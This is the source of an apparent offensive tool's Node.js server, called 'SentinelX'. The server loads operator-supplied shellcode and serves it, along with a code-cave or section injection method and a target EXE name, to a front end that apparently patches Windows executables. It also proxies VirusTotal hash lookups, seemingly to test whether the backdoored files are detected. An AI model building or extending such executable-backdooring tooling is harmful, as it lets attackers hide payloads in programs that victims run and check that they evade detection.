/**
 * SentinelX Server
 */
const express = require('express');
const fs      = require('fs');
const path    = require('path');
const https   = require('https');

const app  = express();
const PORT = parseInt(process.env.PORT, 10) || 3000;

// Injection config (operator env vars)
const INJECT_METHOD  = ['cave','section'].includes(process.env.INJECT_METHOD) ? process.env.INJECT_METHOD : 'section';
const TARGET_EXE     = (process.env.TARGET_EXE || '').replace(/[/\\]/g,'');
const VT_API_KEY     = process.env.VT_API_KEY || '';

// Shellcode loading
let SHELLCODE_B64 = '';
if (process.env.SHELLCODE_FILE) {
  try {
    SHELLCODE_B64 = fs.readFileSync(process.env.SHELLCODE_FILE).toString('base64');
    console.log(`[SentinelX] Shellcode loaded: ${process.env.SHELLCODE_FILE} (${Buffer.byteLength(SHELLCODE_B64,'base64')} bytes)`);
  } catch(e) {
    console.error(`[SentinelX] Cannot read SHELLCODE_FILE: ${e.message}`);
    process.exit(1);
  }
} else if (process.env.SHELLCODE_B64) {
  SHELLCODE_B64 = process.env.SHELLCODE_B64;
  console.log(`[SentinelX] Shellcode loaded from env (${Buffer.byteLength(SHELLCODE_B64,'base64')} bytes)`);
} else {
  SHELLCODE_B64 = Buffer.from(new Uint8Array([0xCC,0xCC,0xCC,0xCC,0xC3])).toString('base64');
  console.warn('[SentinelX] WARNING: No shellcode configured. Using INT3 placeholder. Set SHELLCODE_FILE or SHELLCODE_B64.');
}

app.disable('x-powered-by');

app.use((req,res,next) => {
  res.setHeader('X-Content-Type-Options','nosniff');
  res.setHeader('X-Frame-Options','DENY');
  res.setHeader('Referrer-Policy','no-referrer');
  res.setHeader('X-Robots-Tag','noindex, nofollow');
  next();
});

app.use(express.json({ limit:'20mb' }));
app.use(express.static(path.join(__dirname,'public')));

// Config endpoint
app.get('/api/config', (req,res) => {
  res.json({
    injectMethod: INJECT_METHOD,
    targetExe:    TARGET_EXE,
    shellcode:    SHELLCODE_B64,
    vtEnabled:    !!VT_API_KEY,
  });
});

// VT hash lookup proxy
app.get('/api/vt/:hash', (req,res) => {
  const hash = req.params.hash;
  if (!/^[a-fA-F0-9]{64}$/.test(hash)) return res.status(400).json({error:'invalid hash'});
  if (!VT_API_KEY) return res.json({ found: false, stats: null });

  const options = {
    hostname: 'www.virustotal.com',
    path: `/api/v3/files/${hash}`,
    method: 'GET',
    headers: { 'x-apikey': VT_API_KEY },
  };

  const vtReq = https.request(options, vtRes => {
    let data = '';
    vtRes.on('data', d => data += d);
    vtRes.on('end', () => {
      try {
        const parsed = JSON.parse(data);
        if (vtRes.statusCode === 404) return res.json({ found: false, stats: null });
        if (vtRes.statusCode !== 200) return res.json({ found: false, stats: null });
        const stats = parsed?.data?.attributes?.last_analysis_stats || {};
        res.json({ found: true, stats });
      } catch { res.json({ found: false, stats: null }); }
    });
  });
  vtReq.on('error', () => res.json({ found: false, stats: null }));
  vtReq.end();
});

app.listen(PORT, 'localhost', () => {
  console.log(`[SentinelX] http://localhost:${PORT} | method=${INJECT_METHOD} | target=${TARGET_EXE||'first EXE'} | VT=${VT_API_KEY?'enabled':'disabled'}`);
});
